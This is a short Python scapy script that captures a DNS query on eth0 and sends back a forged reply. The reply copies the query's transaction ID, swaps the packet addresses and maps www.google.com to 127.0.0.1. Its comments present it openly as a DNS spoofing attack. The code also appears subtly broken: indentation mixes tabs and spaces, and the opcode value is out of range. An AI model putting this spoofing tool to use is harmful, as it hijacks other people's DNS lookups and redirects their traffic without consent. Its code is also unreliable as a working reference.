#!/usr/bin/python
import scapy,sys

def main():
        scapy.sniff(iface="eth0",count=1,filter="udp port 53",prn=procPacket)

def procPacket(p):
	#Lets grab the source mac and dst mac
        eth_layer = p.getlayer(scapy.Ether)
        src_mac = eth_layer.src
        dst_mac = eth_layer.dst

	#Now on to grabbing the src IP and dst IP
        ip_layer = p.getlayer(scapy.IP)
        src_ip = ip_layer.src
        dst_ip = ip_layer.dst

	#Woot..UDP Layer
	udp_layer = p.getlayer(scapy.UDP)
	src_port = udp_layer.sport
	dst_port = udp_layer.dport

	#And finally..the DNS layer
        dns_layer = p.getlayer(scapy.DNS)
	d = scapy.DNS()
	d.id = dns_layer.id	#Transaction ID
	d.qr = 1		#1 for Response
	d.opcode = 16	
	d.aa = 0		
	d.tc = 0		
	d.rd = 0
	d.ra = 1
	d.z = 8
	d.rcode = 0
	d.qdcount = 1		#Question Count
	d.ancount = 1		#Answer Count
	d.nscount = 0		#No Name server info
	d.arcount = 0		#No additional records
	d.qd = str(dns_layer.qd)
	d.an = scapy.DNSRR(rrname="www.google.com.", ttl=330, type="A", rclass="IN", rdata="127.0.0.1")

	#Send the spoofed packet away!
	#Don't forget to switch stuffs lawl
	spoofed = scapy.Ether(src=dst_mac, dst=src_mac)/scapy.IP(src=dst_ip, dst=src_ip)/scapy.UDP(sport=dst_port, dport=src_port)/d

	#Off we go!
	scapy.sendp(spoofed, iface_hint=src_ip)
		
main()
